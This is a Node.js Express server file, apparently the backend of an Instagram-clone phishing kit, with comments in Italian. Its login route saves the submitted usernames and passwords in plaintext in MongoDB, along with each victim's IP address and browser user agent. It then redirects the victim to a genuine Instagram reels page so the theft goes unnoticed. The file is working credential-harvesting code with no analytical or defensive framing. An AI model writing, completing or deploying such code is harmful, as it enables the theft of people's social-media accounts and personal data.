const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const authRoutes = require('./routes/auth');
const adminAuthRoutes = require('./routes/admin-auth');

require('dotenv').config();
const app = express();
const port = process.env.PORT || 5000;

// Middleware per il CORS (importante per le API)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// Connessione a MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/igclone', {
})
.then(() => console.log('MongoDB connected...'))
.catch(err => console.error('MongoDB connection error:', err));

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// Modello dei dati di login aggiornato con informazioni sul tema
const LoginSchema = new mongoose.Schema({
  username: String,
  password: String,
  theme: {
    type: String,
    enum: ['light', 'dark'],
    default: 'light'
  },
  timestamp: {
    type: Date,
    default: Date.now
  },
  ipAddress: String,
  userAgent: String
});

const Login = mongoose.model('Login', LoginSchema);

// Route per salvare i dati di login
app.post('/api/login', async (req, res) => {
  try {
    const { username, password, theme } = req.body;
    
    // Salva i dati di login nel database
    const login = new Login({
      username,
      password,
      theme: theme || 'light',
      ipAddress: req.ip,
      userAgent: req.headers['user-agent']
    });
    
    await login.save();
    
    // Risposta di successo
    res.status(200).json({ 
      success: true, 
      redirectUrl: 'https://www.instagram.com/reels/your-reels-id-here/' 
    });
    
  } catch (error) {
    console.error('Errore durante il salvataggio dei dati:', error);
    res.status(500).json({ success: false, message: 'Errore del server' });
  }
});


// Catch-all route
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server is running on port ${port}`);
});